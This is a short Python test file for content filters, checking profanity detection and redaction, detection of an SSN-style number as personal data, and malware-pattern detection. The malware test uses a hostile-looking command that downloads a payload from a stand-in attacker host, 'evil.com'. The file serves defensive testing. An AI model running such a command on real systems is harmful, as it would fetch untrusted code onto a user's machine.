"""
Test Content Filters

Test module for content filters.
"""

from security import (
    detect_malware_patterns,
    detect_personal_data,
    detect_profanity,
    sanitize_text,
)


def test_profanity_filter() -> None:
    assert detect_profanity("This is foo language") is True, "This is not valid"
    assert "[REDACTED]" in sanitize_text("foo fighters"), "Condition must be true"


def test_pii_detection() -> None:
    matches = detect_personal_data("Contact me at 123-45-6789")
    assert "123-45-6789" in matches["pii"], "Condition must be true"


def test_malware_pattern_detection() -> None:
    hits = detect_malware_patterns("curl http://evil.com -o /tmp/payload")
    assert hits, "hits is not valid"
